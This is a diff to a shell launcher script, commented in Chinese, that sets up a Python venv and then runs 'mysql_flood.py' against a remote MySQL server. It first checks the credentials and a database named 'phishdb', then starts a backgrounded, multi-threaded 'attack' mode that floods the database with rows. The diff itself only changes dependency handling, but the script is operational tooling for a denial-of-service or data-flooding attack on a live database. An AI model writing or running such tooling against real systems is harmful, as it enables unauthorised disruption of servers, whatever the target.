@@ -42,18 +42,25 @@ if ! command -v python3 >/dev/null 2>&1; then
 fi
 echo "[+] python3: $(python3 --version 2>&1)"
 
-# 2. 安装 pymysql
+# 2. 准备 venv 并安装 pymysql (兼容 Ubuntu PEP 668)
+PY="python3"
 if ! python3 -c "import pymysql" >/dev/null 2>&1; then
-    echo "[*] 安装 pymysql..."
-    python3 -m pip install pymysql -q || pip3 install pymysql -q || {
-        echo "[-] pymysql 安装失败"; exit 1
-    }
+    echo "[*] 系统无 pymysql, 用 venv 安装..."
+    if [ ! -d ".venv" ]; then
+        python3 -m venv .venv || {
+            echo "[-] venv 创建失败, 请: apt install -y python3-venv"; exit 1
+        }
+    fi
+    PY=".venv/bin/python"
+    if ! "$PY" -c "import pymysql" >/dev/null 2>&1; then
+        .venv/bin/pip install -q pymysql || { echo "[-] pymysql 安装失败"; exit 1; }
+    fi
 fi
-echo "[+] pymysql 就绪"
+echo "[+] pymysql 就绪 ($PY)"
 
 # 3. 先 demo 验证凭据 + 确认 phishdb
 echo "[*] 验证连接 (demo 模式)..."
-python3 mysql_flood.py --host "$HOST" --port "$PORT" --user "$MYSQL_USER" --pass "$MYSQL_PASS" --mode demo
+$PY mysql_flood.py --host "$HOST" --port "$PORT" --user "$MYSQL_USER" --pass "$MYSQL_PASS" --mode demo
 RC=$?
 if [ "$MODE" = "demo" ]; then
     echo "[*] demo 结束, 退出"; exit $RC
@@ -61,7 +68,7 @@ fi
 
 # 4. 启动攻击 (后台 + unbuffered)
 echo "[*] 启动 ${MODE} 模式 (后台)..."
-nohup python3 -u mysql_flood.py \
+nohup $PY -u mysql_flood.py \
     --host "$HOST" --port "$PORT" --user "$MYSQL_USER" --pass "$MYSQL_PASS" \
     --mode "$MODE" --threads "$THREADS" --rowsize "$ROWSIZE" \
     > mysql_flood.log 2>&1 &
